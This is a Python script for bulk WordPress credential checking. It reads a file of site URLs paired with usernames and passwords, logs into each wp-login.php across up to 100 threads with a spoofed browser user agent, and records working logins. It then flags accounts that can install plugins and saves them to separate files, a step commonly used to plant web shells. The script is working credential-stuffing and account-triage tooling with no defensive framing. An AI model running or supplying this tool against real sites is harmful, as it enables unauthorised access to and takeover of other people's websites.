import requests
from bs4 import BeautifulSoup
import urllib.parse
from colorama import Fore, init
import threading

init(autoreset=True)

def print_greeting():
    banner = """
__________.__               .__                    
\____   | \  |  __ __  ____ |__| ____     ______  
 |     ___/  | |  |  \/ ___\|  |/    \   /  ___/
 |  | |   |  |_|  |  / /_/  >  |   |  \  \___ \  
 |____|   |____/____/\___  /|__|___|  / /____  >
                    /_____/         \/       \/   
    """
    print(banner)

def check_plugin_install_permission(url, username, password):
    login_url = f"{url}/wp-login.php"
    plugin_url = f"{url}/wp-admin/plugins.php"
    
    session = requests.Session()
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/plain'
    }
    
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': plugin_url,
        'testcookie': '1'
    }
    
    response = session.post(login_url, data=login_data, headers=headers)
    
    if "Dashboard" in response.text:
        print(f"{Fore.GREEN}[✓] Login successful {url}!{Fore.RESET}")
        login_success = True
        with open("success_login.txt", "a") as success_file:
            success_file.write(f"{url}/wp-login.php#{username}@{password}\n")
    else:
        print(f"{Fore.RED}[X] Login failed {url}.{Fore.RESET}")
        login_success = False
    
    if login_success:
        response = session.get(plugin_url, headers=headers)
        
        soup = BeautifulSoup(response.text, 'html.parser')
        install_button = soup.find('a', text='Add New')
        
        if install_button:
            print(f"{Fore.GREEN}[✓] Can Install Plugins{Fore.RESET} {url}.")
            with open("manager.txt", "a") as manager_file:
                manager_file.write(f"{url}/wp-login.php#{username}@{password}\n")
            return True
        else:
            print(f"{Fore.RED}[X] Can't Install Plugins{Fore.RESET} {url}.")
            return False
    return False

def process_sites(sites):
    for line in sites:
        line = line.strip()
        if line:
            parsed_url = urllib.parse.urlparse(line)
            path = parsed_url.path
            fragment = parsed_url.fragment
            user_pass = fragment.split('@')
            
            if len(user_pass) != 2:
                print(f"Invalid URL format: {line}. Skipping.")
                continue
            
            username = user_pass[0].replace('#', '')
            password = user_pass[1]
            
            base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
            
            check_plugin_install_permission(base_url, username, password)

def main():
    print_greeting()
    
    input_file = input("-FILE WORDPRESS: ")
    
    try:
        with open(input_file, 'r') as file:
            sites = file.readlines()
    except FileNotFoundError:
        print(f"File {input_file} not found.")
        return
    
    num_threads = int(input("-THREADS (10-100): "))
    threads = []
    
    for i in range(num_threads):
        thread_sites = sites[i::num_threads]
        thread = threading.Thread(target=process_sites, args=(thread_sites,))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
    
